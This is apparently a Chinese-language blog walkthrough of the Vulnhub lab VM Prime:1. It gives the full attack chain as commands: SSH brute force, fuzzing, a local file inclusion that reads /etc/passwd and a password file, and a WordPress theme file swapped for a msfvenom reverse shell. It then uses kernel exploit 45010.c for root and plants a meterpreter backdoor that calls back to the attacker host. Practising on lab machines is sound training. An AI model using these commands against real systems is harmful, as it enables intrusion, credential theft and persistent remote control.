---
title: 靶机渗透实战基础-Vulnhub-Prime_1
date: 2024-01-19 18:46:46
tags: 渗透测试
mathjax: true
---

# 靶机渗透实战基础-Vulnhub-Prime:1

## 主机发现&端口扫描

攻击主机IP：192.168.2.130，C段扫描：

```bash
nmap -sP 192.168.2.1/24
```

发现目标主机IP地址为：192.168.2.198。

进行进攻性扫描：

```bash
nmap -A 192.168.2.198
```

发现两个端口开放：

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8d:c5:20:23:ab:10:ca:de:e2:fb:e5:cd:4d:2d:4d:72 (RSA)
|   256 94:9c:f8:6f:5c:f1:4c:11:95:7f:0a:2c:34:76:50:0b (ECDSA)
|_  256 4b:f6:f1:25:b6:13:26:d4:fc:9e:b0:72:9f:f4:69:68 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: HacknPentest
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## 漏洞发现

搜索Apache 2.4.18漏洞：

```bash
searchsploit Apache 2.4
```

并没有。

有OpenSSH，爆弱口令：

```bash
hydra -C /usr/share/wordlists/legion/ssh-betterdefaultpasslist.txt 192.168.2.198 ssh
```

然而并没有，回去看80端口，发现只有一张图骗，怀疑存在隐写，用wget下载：

```bash
wget http://192.168.2.198:80/hacknpentest.png
strings hacknpentest.png > strs.txt
bat strs.txt
```

没啥东西。

## 目录爆破

```bash
dirb http://192.168.2.198
```

除了inde.php，还有dev路由，访问：

```bash
curl http://192.168.2.198/dev
```

价值不大。

还有WordPress路由，访问，发现页面提示有用户名victor。

接下来爆文件：

```bash
dirb http://192.168.2.198 -X .php,.txt
```

有secret.txt和image.php，访问secret.txt，提示有locations.txt和需要模糊测试。

## 模糊测试

对image.php的传参进行模糊测试：

```bash
wfuzz -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt http://192.168.2.198/image.php?FUZZ
```

只要chars相同就不用管，尝试过滤掉147：

```bash
wfuzz -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt --hh 147 http://192.168.2.198/image.php?FUZZ
```

没东西，再试试index.php：

```bash
wfuzz -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt --hh 136 http://192.168.2.198/index.php?FUZZ
```

有个好东西：参数file。访问：http://192.168.2.198/index.php?file=asdf结果报错。想到之前提示location.txt这玩意儿，尝试LFI文件包含漏洞：http://192.168.2.198/index.php?file=location.txt。

提示拿到某参数“secrettier360”？？？

尝试发现不是WordPress的密码，于是尝试读取passwd文件：

```bash
curl http://192.168.2.198/image.php?secrettier360=/etc/passwd
```

找到显眼信息：/home/saket/password.txt，继续读取该文件：

```bash
curl http://192.168.2.198/image.php?secrettier360=/home/saket/password.txt
```

找到了不知道啥东西：follow_the_ippsec，猜测为WordPress后台密码。

之前提示有用户victor，也可以尝试爆破用户名：

```bash
wpscan --url http://192.168.2.198/wordpress --enumerate u
```

尝试登录发现是对的，尝试找一个可写的文件，最终找到主题2019的secret.php可写，尝试弹shell。

## 内核提权

用msfvenom弹shell：

```bash
msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.2.130 LPORT=7777 -s shell.php
```

读取shell.php并上传，用msfconsole连接：

```
use exploit/mutli/handler
set payload php/meterpreter_reverse_tcp
set lhost 192.168.2.130
set lport 7777
exploit
```

一个很重要的知识点：secret.php所在路径为/wordpress/wp-content/themes/twentynineteen/secret.php，访问后即连接上meterpreter。

尝试getuid和sysinfo，发现内核版本为4.10.0-28，查看有什么提权操作：

```bash
searchsploit Ubuntu 4.10.0
```

找到45010.c提权操作：

```bash
cp /usr/share/exploitdb/exploits/linux/local/45010.c .
```

并利用meterpreter进行上传后，打开shell：

```
upload /home/monoceros406/Desktop/CTF-Workbench/45010.c /tmp/45010.c
shell
```

进入shell后，利用本地gcc编译。如果利用攻击主机gcc编译，会发现靶机的libc版本不是一般低...

在shell中：

```bash
cd /tmp
gcc 45010.c -o 45010
./45010
whoami
```

完结散花！

## 瞎搞

拿root后改密码，改成abcdefg：

```bash
passwd root
```

在虚拟机里登进去，图片中发现一张截图，victor的密码是：victorcandoanything。

但是这个meterpreter也没啥好玩儿的，php/linux型各种操作都受限制...

造毒：

```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=192.168.2.130 lport=4443 -f elf > backdoor
```

然后上传：

```
upload /home/monoceros406/Desktop/CTF-Workbench/backdoor /tmp
```

目标主机运行：

```bash
cd /tmp
./45010 #先提权
chmod 777 ./backdoor
./backdoor &
```

尽快启动新的msfconsole，进行连接：

```
use exploit/multi/handler
set payload linux/x86/meterpreter/reverse_tcp
set lhost 192.168.2.130
set lport 4443
exploit
```

发现还是无法使用screenshot或keyscan等...
